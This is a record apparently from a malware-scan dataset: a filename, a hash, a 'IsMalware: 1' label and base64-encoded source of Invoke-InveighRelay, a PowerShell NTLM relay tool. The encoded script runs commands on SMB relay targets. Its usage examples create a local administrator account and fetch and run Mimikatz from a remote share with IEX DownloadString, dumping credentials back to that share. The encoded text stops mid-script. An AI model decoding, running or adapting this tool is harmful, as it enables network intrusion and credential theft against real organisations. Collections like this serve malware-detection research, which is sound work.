Inveigh-Relay.ps1,fad2bf73b025e13400e4fc33e7c6a42a,Scan result is 32768. IsMalware: 1,RnVuY3Rpb24gSW52b2tlLUludmVpZ2hSZWxheQp7CjwjCi5TWU5PUFNJUwpJbnZva2UtSW52ZWlnaFJlbGF5IHBlcmZvcm1zIE5UTE12MiBIVFRQIHRvIFNNQiByZWxheSB3aXRoIHBzZXhlYyBzdHlsZSBjb21tYW5kIGV4ZWN1dGlvbi4KCi5ERVNDUklQVElPTgpJbnZva2UtSW52ZWlnaFJlbGF5IGN1cnJlbnRseSBzdXBwb3J0cyBOVExNdjIgSFRUUCB0byBTTUIgcmVsYXkgd2l0aCBwc2V4ZWMgc3R5bGUgY29tbWFuZCBleGVjdXRpb24uCgogICAgSFRUUC9IVFRQUyB0byBTTUIgTlRMTXYyIHJlbGF5IHdpdGggZ3JhbnVsYXIgY29udHJvbAogICAgTlRMTXYxL05UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZSBvdmVyIEhUVFAvSFRUUFMKICAgIEdyYW51bGFyIGNvbnRyb2wgb2YgY29uc29sZSBhbmQgZmlsZSBvdXRwdXQKICAgIENhbiBiZSBleGVjdXRlZCBhcyBlaXRoZXIgYSBzdGFuZGFsb25lIGZ1bmN0aW9uIG9yIHRocm91Z2ggSW52b2tlLUludmVpZ2gKCi5QQVJBTUVURVIgSFRUUApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgSFRUUCBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4KCi5QQVJBTUVURVIgSFRUUFMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBIVFRQUyBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4gV2FybmluZywgYSBjZXJ0IHdpbGwgYmUgaW5zdGFsbGVkIGluIHRoZSBsb2NhbCBzdG9yZSBhbmQgYXR0YWNoZWQgdG8gcG9ydCA0NDMuCklmIHRoZSBzY3JpcHQgZG9lcyBub3QgZXhpdCBncmFjZWZ1bGx5LCBleGVjdXRlICJuZXRzaCBodHRwIGRlbGV0ZSBzc2xjZXJ0IGlwcG9ydD0wLjAuMC4wOjQ0MyIgYW5kIG1hbnVhbGx5IHJlbW92ZSB0aGUgY2VydGlmaWNhdGUgZnJvbSAiTG9jYWwgQ29tcHV0ZXJcUGVyc29uYWwiIGluIHRoZSBjZXJ0IHN0b3JlLgoKLlBBUkFNRVRFUiBIVFRQU0NlcnRBcHBJRApTcGVjaWZ5IGEgdmFsaWQgYXBwbGljYXRpb24gR1VJRCBmb3IgdXNlIHdpdGggdGhlIGNlcml0aWNhdGUuCgouUEFSQU1FVEVSIEhUVFBTQ2VydFRodW1icHJpbnQKU3BlY2lmeSBhIGNlcnRpZmljYXRlIHRodW1icHJpbnQgZm9yIHVzZSB3aXRoIGEgY3VzdG9tIGNlcnRpZmljYXRlLiBUaGUgY2VydGlmaWNhdGUgZmlsZW5hbWUgbXVzdCBiZSBsb2NhdGVkIGluIHRoZSBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5IGFuZCBuYW1lZCBJbnZlaWdoLnBmeC4KCi5QQVJBTUVURVIgQ2hhbGxlbmdlCkRlZmF1bHQgPSBSYW5kb206IFNwZWNpZnkgYSAxNiBjaGFyYWN0ZXIgaGV4IE5UTE0gY2hhbGxlbmdlIGZvciB1c2Ugd2l0aCB0aGUgSFRUUCBsaXN0ZW5lci4gSWYgbGVmdCBibGFuaywgYSByYW5kb20gY2hhbGxlbmdlIHdpbGwgYmUgZ2VuZXJhdGVkIGZvciBlYWNoIHJlcXVlc3QuCk5vdGUgdGhhdCBkdXJpbmcgU01CIHJlbGF5IGF0dGVtcHRzLCB0aGUgY2hhbGxlbmdlIHdpbGwgYmUgcHVsbGVkIGZyb20gdGhlIFNNQiByZWxheSB0YXJnZXQuIAoKLlBBUkFNRVRFUiBNYWNoaW5lQWNjb3VudHMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBzaG93aW5nIE5UTE0gY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVzIGZyb20gbWFjaGluZSBhY2NvdW50cy4KCi5QQVJBTUVURVIgV1BBREF1dGgKRGVmYXVsdCA9IE5UTE06IChBbm9ueW1vdXMsTlRMTSkgU3BlY2lmeSB0aGUgSFRUUC9IVFRQUyBzZXJ2ZXIgYXV0aGVudGljYXRpb24gdHlwZSBmb3Igd3BhZC5kYXQgcmVxdWVzdHMuIFNldHRpbmcgdG8gQW5vbnltb3VzIGNhbiBwcmV2ZW50IGJyb3dzZXIgbG9naW4gcHJvbXB0cy4KCi5QQVJBTUVURVIgU01CUmVsYXlUYXJnZXQKSVAgYWRkcmVzcyBvZiBzeXN0ZW0gdG8gdGFyZ2V0IGZvciBTTUIgcmVsYXkuCgouUEFSQU1FVEVSIFNNQlJlbGF5Q29tbWFuZApDb21tYW5kIHRvIGV4ZWN1dGUgb24gU01CIHJlbGF5IHRhcmdldC4KCi5QQVJBTUVURVIgU01CUmVsYXlVc2VybmFtZXMKRGVmYXVsdCA9IEFsbCBVc2VybmFtZXM6IENvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIHVzZXJuYW1lcyB0byB1c2UgZm9yIHJlbGF5IGF0dGFja3MuIEFjY2VwdHMgYm90aCB1c2VybmFtZSBhbmQgZG9tYWluXHVzZXJuYW1lIGZvcm1hdC4gCgouUEFSQU1FVEVSIFNNQlJlbGF5QXV0b0Rpc2FibGUKRGVmYXVsdCA9IEVuYWJsZTogKFkvTikgQXV0b21hdGljYWx5IGRpc2FibGUgU01CIHJlbGF5IGFmdGVyIGEgc3VjY2Vzc2Z1bCBjb21tYW5kIGV4ZWN1dGlvbiBvbiB0YXJnZXQuCgouUEFSQU1FVEVSIFNNQlJlbGF5TmV0d29ya1RpbWVvdXQKRGVmYXVsdCA9IE5vIFRpbWVvdXQ6IChJbnRlZ2VyKSBTZXQgdGhlIGR1cmF0aW9uIGluIHNlY29uZHMgdGhhdCBJbnZlaWdoIHdpbGwgd2FpdCBmb3IgYSByZXBseSBmcm9tIHRoZSBTTUIgcmVsYXkgdGFyZ2V0IGFmdGVyIGVhY2ggcGFja2V0IGlzIHNlbnQuCgouUEFSQU1FVEVSIENvbnNvbGVPdXRwdXQKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSByZWFsIHRpbWUgY29uc29sZSBvdXRwdXQuIElmIHVzaW5nIHRoaXMgb3B0aW9uIHRocm91Z2ggYSBzaGVsbCwgdGVzdCB0byBlbnN1cmUgdGhhdCBpdCBkb2Vzbid0IGhhbmcgdGhlIHNoZWxsLgoKLlBBUkFNRVRFUiBGaWxlT3V0cHV0CkRlZmF1bHQgPSBEaXNhYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgcmVhbCB0aW1lIGZpbGUgb3V0cHV0LgoKLlBBUkFNRVRFUiBTdGF0dXNPdXRwdXQKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHN0YXJ0dXAgYW5kIHNodXRkb3duIG1lc3NhZ2VzLgoKLlBBUkFNRVRFUiBPdXRwdXRTdHJlYW1Pbmx5CkRlZmF1bHQgPSBEaXNhYmxlZDogRW5hYmxlL0Rpc2FibGUgZm9yY2luZyBhbGwgb3V0cHV0IHRvIHRoZSBzdGFuZGFyZCBvdXRwdXQgc3RyZWFtLiBUaGlzIGNhbiBiZSBoZWxwZnVsIGlmIHJ1bm5pbmcgSW52ZWlnaCBSZWxheSB0aHJvdWdoIGEgc2hlbGwgdGhhdCBkb2VzIG5vdCByZXR1cm4gb3RoZXIgb3V0cHV0IHN0cmVhbXMuCk5vdGUgdGhhdCB5b3Ugd2lsbCBub3Qgc2VlIHRoZSB2YXJpb3VzIHllbGxvdyB3YXJuaW5nIG1lc3NhZ2VzIGlmIGVuYWJsZWQuCgouUEFSQU1FVEVSIE91dHB1dERpcgpEZWZhdWx0ID0gV29ya2luZyBEaXJlY3Rvcnk6IFNldCBhIHZhbGlkIHBhdGggdG8gYW4gb3V0cHV0IGRpcmVjdG9yeSBmb3IgbG9nIGFuZCBjYXB0dXJlIGZpbGVzLiBGaWxlT3V0cHV0IG11c3QgYWxzbyBiZSBlbmFibGVkLgoKLlBBUkFNRVRFUiBTaG93SGVscApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgdGhlIGhlbHAgbWVzc2FnZXMgYXQgc3RhcnR1cC4KCi5QQVJBTUVURVIgUnVuVGltZQooSW50ZWdlcikgU2V0IHRoZSBydW4gdGltZSBkdXJhdGlvbiBpbiBtaW51dGVzLgoKLlBBUkFNRVRFUiBUb29sCkRlZmF1bHQgPSAwOiAoMCwxLDIpIEVuYWJsZS9EaXNhYmxlIGZlYXR1cmVzIGZvciBiZXR0ZXIgb3BlcmF0aW9uIHRocm91Z2ggZXh0ZXJuYWwgdG9vbHMgc3VjaCBhcyBNZXRhc3Bsb2l0J3MgSW50ZXJhY3RpdmUgUG93ZXJzaGVsbCBTZXNzaW9ucyBhbmQgRW1waXJlLiAwID0gTm9uZSwgMSA9IE1ldGFzcGxvaXQsIDIgPSBFbXBpcmUgIAoKLkVYQU1QTEUKSW52b2tlLUludmVpZ2hSZWxheSAtU01CUmVsYXlUYXJnZXQgMTkyLjE2OC4yLjU1IC1TTUJSZWxheUNvbW1hbmQgIm5ldCB1c2VyIERhdmUgV2ludGVyMjAxNiAvYWRkICYmIG5ldCBsb2NhbGdyb3VwIGFkbWluaXN0cmF0b3JzIERhdmUgL2FkZCIKRXhlY3V0ZSB3aXRoIFNNQiByZWxheSBlbmFibGVkIHdpdGggYSBjb21tYW5kIHRoYXQgd2lsbCBjcmVhdGUgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIGFjY291bnQgb24gdGhlIFNNQiByZWxheSB0YXJnZXQuICAKCi5FWEFNUExFCkludm9rZS1JbnZlaWdoUmVsYXkgLVNNQlJlbGF5VGFyZ2V0IDE5Mi4xNjguMi41NSAtU01CUmVsYXlDb21tYW5kICJwb3dlcnNoZWxsIFxcMTkyLjE2OC4yLjUwXHRlbXAkXHBvd2VybWV1cC5jbWQiCkV4ZWN1dGUgd2l0aCBTTUIgcmVsYXkgZW5hYmxlZCBhbmQgdXNpbmcgTXViaXgncyBwb3dlcm1ldXAuY21kIG1ldGhvZCBvZiBsYXVuY2hpbmcgSW52b2tlLU1pbWlrYXR6LnBzMSBhbmQgdXBsb2FkaW5nIG91dHB1dC4gSW4gdGhpcyBleGFtcGxlLCBhIGhpZGRlbiBhbm9ueW1vdXMgc2hhcmUgY29udGFpbmluZyBJbnZva2UtTWltaWthdHoucHMxIGlzIGVtcGxveWVkIG9uIHRoZSBJbnZlaWdoIGhvc3Qgc3lzdGVtLiAKUG93ZXJtZXVwLmNtZCBjb250ZW50cyB1c2VkIGZvciB0aGlzIGV4YW1wbGU6CnBvd2Vyc2hlbGwgIklFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnXFwxOTIuMTY4LjIuNTBcdGVtcCRcSW52b2tlLU1pbWlrYXR6LnBzMScpOyBJbnZva2UtTWltaWthdHogLUR1bXBDcmVkcyA+IFxcMTkyLjE2OC4yLjUwXHRlbXAkXCVDT01QVVRFUk5BTUUlLnR4dCAyPiYxIgpPcmlnaW5hbCB2ZXJzaW9uOgpodHRwczovL2dpdGh1Yi5jb20vbXViaXgvcG9zdC1leHBsb2l0YXRpb24vYmxvYi9tYXN0ZXIvc2NyaXB0cy9tYXNzX21pbWlrYXR6L3Bvd2VybWV1cC5jbWQKCi5MSU5LCmh0dHBzOi8vZ2l0aHViLmNvbS9LZXZpbi1Sb2JlcnRzb24vSW52ZWlnaAojPgoKIyBQYXJhbWV0ZXIgZGVmYXVsdCB2YWx1ZXMgY2FuIGJlIG1vZGlmaWVkIGluIHRoaXMgc2VjdGlvbjoKcGFyYW0KKCAKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtzdHJpbmddJEhUVFA9IlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW3N0cmluZ10kSFRUUFM9Ik4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW3N0cmluZ10kQ29uc29sZU91dHB1dD0iTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bc3RyaW5nXSRGaWxlT3V0cHV0PSJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtzdHJpbmddJFN0YXR1c091dHB1dD0iWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bc3RyaW5nXSRPdXRwdXRTdHJlYW1Pbmx5PSJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtzdHJpbmddJE1hY2hpbmVBY2NvdW50cz0iTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bc3RyaW5nXSRTaG93SGVscD0iWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bc3RyaW5nXSRTTUJSZWxheUF1dG9EaXNhYmxlPSJZIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJBbm9ueW1vdXMiLCJOVExNIildW3N0cmluZ10kV1BBREF1dGg9Ik5UTE0iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIjAiLCIxIiwiMiIpXVtzdHJpbmddJFRvb2w9IjAiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAkX30pXVtzdHJpbmddJE91dHB1dERpcj0iIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV1bVmFsaWRhdGVTY3JpcHQoeyRfIC1tYXRjaCBbSVBBZGRyZXNzXSRfIH0pXVtzdHJpbmddJFNNQlJlbGF5VGFyZ2V0ID0iIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlUGF0dGVybignXltBLUZhLWYwLTldezE2fSQnKV1bc3RyaW5nXSRDaGFsbGVuZ2U9IiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVthcnJheV0kU01CUmVsYXlVc2VybmFtZXM9IiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtpbnRdJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQ9IiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtpbnRdJFJ1blRpbWU9IiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldW3N0cmluZ10kU01CUmVsYXlDb21tYW5kID0gIiIsIAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bc3RyaW5nXSRIVFRQU0NlcnRBcHBJRD0iMDAxMTIyMzMtNDQ1NS02Njc3LTg4OTktQUFCQkNDRERFRUZGIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW3N0cmluZ10kSFRUUFNDZXJ0VGh1bWJwcmludD0iOThjMWQ1NDg0MGM1YzEyY2VkNzEwNzU4YjZlZTU2Y2M2MmZhMWYwZCIsCiAgICBbcGFyYW1ldGVyKFZhbHVlRnJvbVJlbWFpbmluZ0FyZ3VtZW50cz0kdHJ1ZSldJGludmFsaWRfcGFyYW1ldGVyCikKCmlmICgkaW52YWxpZF9wYXJhbWV0ZXIpCnsKICAgIHRocm93ICIkKCRpbnZhbGlkX3BhcmFtZXRlcikgaXMgbm90IGEgdmFsaWQgcGFyYW1ldGVyLiIKfQoKaWYoISRTTUJSZWxheVRhcmdldCkKewogICAgVGhyb3cgIllvdSBtdXN0IHNwZWNpZnkgYW4gLVNNQlJlbGF5VGFyZ2V0IGlmIGVuYWJsaW5nIC1TTUJSZWxheSIKfQoKaWYoISRTTUJSZWxheUNvbW1hbmQpCnsKICAgIFRocm93ICJZb3UgbXVzdCBzcGVjaWZ5IGFuIC1TTUJSZWxheUNvbW1hbmQgaWYgZW5hYmxpbmcgLVNNQlJlbGF5Igp9CgppZighJE91dHB1dERpcikKeyAKICAgICRvdXRwdXRfZGlyZWN0b3J5ID0gJFBXRC5QYXRoCn0KZWxzZQp7CiAgICAkb3V0cHV0X2RpcmVjdG9yeSA9ICRPdXRwdXREaXIKfQoKaWYoISRpbnZlaWdoKQp7CiAgICAkZ2xvYmFsOmludmVpZ2ggPSBbaGFzaHRhYmxlXTo6U3luY2hyb25pemVkKEB7fSkKICAgICRpbnZlaWdoLmxvZyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYxX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12Ml9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgPSBAKCkKICAgICRpbnZlaWdoLlNNQlJlbGF5X2ZhaWxlZF9saXN0ID0gQCgpCn0KCmlmKCRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuSXNMaXN0ZW5pbmcpCnsKICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuU3RvcCgpCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLkNsb3NlKCkKfQoKaWYoISRpbnZlaWdoLnJ1bm5pbmcpCnsKICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12MV9maWxlX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guY2VydGlmaWNhdGVfYXBwbGljYXRpb25fSUQgPSAkSFRUUFNDZXJ0QXBwSUQKICAgICRpbnZlaWdoLmNlcnRpZmljYXRlX3RodW1icHJpbnQgPSAkSFRUUFNDZXJ0VGh1bWJwcmludAogICAgJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0ID0gJGZhbHNlCiAgICAkaW52ZWlnaC5jb25zb2xlX2lucHV0ID0gJHRydWUKICAgICRpbnZlaWdoLmZpbGVfb3V0cHV0ID0gJGZhbHNlCiAgICAkaW52ZWlnaC5sb2dfb3V0X2ZpbGUgPSAkb3V0cHV0X2RpcmVjdG9yeSArICJcSW52ZWlnaC1Mb2cudHh0IgogICAgJGludmVpZ2guTlRMTXYxX291dF9maWxlID0gJG91dHB1dF9kaXJlY3RvcnkgKyAiXEludmVpZ2gtTlRMTXYxLnR4dCIKICAgICRpbnZlaWdoLk5UTE12Ml9vdXRfZmlsZSA9ICRvdXRwdXRfZGlyZWN0b3J5ICsgIlxJbnZlaWdoLU5UTE12Mi50eHQiCiAgICAkSW52ZWlnaC5jaGFsbGVuZ2UgPSAkQ2hhbGxlbmdlCn0KCiRpbnZlaWdoLnJlbGF5X3J1bm5pbmcgPSAkdHJ1ZQokaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiRpbnZlaWdoLlNNQl9yZWxheSA9ICR0cnVlCgppZigkU3RhdHVzT3V0cHV0IC1lcSAneScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19vdXRwdXQgPSAkdHJ1ZQp9CmVsc2UKewogICAgJGludmVpZ2guc3RhdHVzX291dHB1dCA9ICRmYWxzZQp9CgppZigkT3V0cHV0U3RyZWFtT25seSAtZXEgJ3knKQp7CiAgICAkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkgPSAkdHJ1ZQp9CmVsc2UKewogICAgJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5ID0gJGZhbHNlCn0KCmlmKCRUb29sIC1lcSAxKSAjIE1ldGFzcGxvaXQgSW50ZXJhY3RpdmUgUG93ZXJzaGVsbAp7CiAgICAkaW52ZWlnaC50b29sID0gMQogICAgJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5ID0gJHRydWUKICAgICRpbnZlaWdoLm5ld2xpbmUgPSAiIgogICAgJENvbnNvbGVPdXRwdXQgPSAiTiIKfQplbHNlaWYoJFRvb2wgLWVxIDIpICMgUG93ZXJTaGVsbCBFbXBpcmUKewogICAgJGludmVpZ2gudG9vbCA9IDIKICAgICRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSA9ICR0cnVlCiAgICAkaW52ZWlnaC5jb25zb2xlX2lucHV0ID0gJGZhbHNlCiAgICAkaW52ZWlnaC5uZXdsaW5lID0gImBuIgogICAgJENvbnNvbGVPdXRwdXQgPSAiWSIKICAgICRTaG93SGVscCA9ICJOIgp9CmVsc2UKewogICAgJGludmVpZ2gudG9vbCA9IDAKICAgICRpbnZlaWdoLm5ld2xpbmUgPSAiIgp9CgojIFdyaXRlIHN0YXJ0dXAgbWVzc2FnZXMKaWYoISRpbnZlaWdoLnJ1bm5pbmcpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIkludmVpZ2ggUmVsYXkgc3RhcnRlZCBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpfE91dC1OdWxsCiAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIFJlbGF5IHN0YXJ0ZWQiKV0pIHxPdXQtTnVsbAoKICAgIGlmKCRIVFRQIC1lcSAneScpCiAgICB7CiAgICAgICAgJGludmVpZ2guSFRUUCA9ICR0cnVlCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiSFRUUCBDYXB0dXJlIEVuYWJsZWQiKXxPdXQtTnVsbAogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRpbnZlaWdoLkhUVFAgPSAkZmFsc2UKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJIVFRQIENhcHR1cmUgRGlzYWJsZWQiKXxPdXQtTnVsbAogICAgfQoKICAgIGlmKCRIVFRQUyAtZXEgJ3knKQogICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guSFRUUFMgPSAkdHJ1ZQogICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuWDUwOUNlcnRpZmljYXRlcy5YNTA5U3RvcmUoIk15IiwiTG9jYWxNYWNoaW5lIikKICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLk9wZW4oJ1JlYWRXcml0ZScpCiAgICAgICAgICAgICRjZXJ0aWZpY2F0ZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzLlg1MDlDZXJ0aWZpY2F0ZTIKICAgICAgICAgICAgJGNlcnRpZmljYXRlLkltcG9ydCgkUFdELlBhdGggKyAiXEludmVpZ2gucGZ4IikKICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLkFkZCgkY2VydGlmaWNhdGUpIAogICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuQ2xvc2UoKQogICAgICAgICAgICAkbmV0c2hfY2VydGhhc2ggPSAiY2VydGhhc2g9IiArICRpbnZlaWdoLmNlcnRpZmljYXRlX3RodW1icHJpbnQKICAgICAgICAgICAgJG5ldHNoX2FwcF9JRCA9ICJhcHBpZD17IiArICRpbnZlaWdoLmNlcnRpZmljYXRlX2FwcGxpY2F0aW9uX0lEICsgIn0iCiAgICAgICAgICAgICRuZXRzaF9hcmd1bWVudHMgPSBAKCJodHRwIiwiYWRkIiwic3NsY2VydCIsImlwcG9ydD0wLjAuMC4wOjQ0MyIsJG5ldHNoX2NlcnRoYXNoLCRuZXRzaF9hcHBfSUQpCiAgICAgICAgICAgICYgIm5ldHNoIiAkbmV0c2hfYXJndW1lbnRzID4gJG51bGwKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiSFRUUFMgQ2FwdHVyZSBFbmFibGVkIil8T3V0LU51bGwKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5DbG9zZSgpCiAgICAgICAgICAgICRIVFRQUz0iTiIKICAgICAgICAgICAgJGludmVpZ2guSFRUUFMgPSAkZmFsc2UKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiSFRUUFMgQ2FwdHVyZSBEaXNhYmxlZCBEdWUgVG8gQ2VydGlmaWNhdGUgSW5zdGFsbCBFcnJvciIpfE91dC1OdWxsCiAgICAgICAgfQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIkhUVFBTIENhcHR1cmUgRGlzYWJsZWQiKXxPdXQtTnVsbAogICAgfQoKICAgIGlmKCRDaGFsbGVuZ2UpCiAgICB7CiAgICAgICAgJEludmVpZ2guY2hhbGxlbmdlID0gJGNoYWxsZW5nZQogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIk5UTE0gQ2hhbGxlbmdlID0gJENoYWxsZW5nZSIpfE91dC1OdWxsCiAgICB9CgogICAgaWYoJE1hY2hpbmVBY2NvdW50cyAtZXEgJ24nKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIklnbm9yaW5nIE1hY2hpbmUgQWNjb3VudHMiKXxPdXQtTnVsbAogICAgfQoKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIkZvcmNlIFdQQUQgQXV0aGVudGljYXRpb24gPSAkV1BBREF1dGgiKXxPdXQtTnVsbAoKICAgIGlmKCRDb25zb2xlT3V0cHV0IC1lcSAneScpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiUmVhbCBUaW1lIENvbnNvbGUgT3V0cHV0IEVuYWJsZWQiKXxPdXQtTnVsbAogICAgICAgICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0ID0gJHRydWUKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBpZigkaW52ZWlnaC50b29sIC1lcSAxKQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiUmVhbCBUaW1lIENvbnNvbGUgT3V0cHV0IERpc2FibGVkIER1ZSBUbyBFeHRlcm5hbCBUb29sIFNlbGVjdGlvbiIpfE91dC1OdWxsCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIlJlYWwgVGltZSBDb25zb2xlIE91dHB1dCBEaXNhYmxlZCIpfE91dC1OdWxsCiAgICAgICAgfQogICAgfQoKICAgIGlmKCRGaWxlT3V0cHV0IC1lcSAneScpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiUmVhbCBUaW1lIEZpbGUgT3V0cHV0IEVuYWJsZWQiKXxPdXQtTnVsbAogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIk91dHB1dCBEaXJlY3RvcnkgPSAkb3V0cHV0X2RpcmVjdG9yeSIpfE91dC1OdWxsCiAgICAgICAgJGludmVpZ2guZmlsZV9vdXRwdX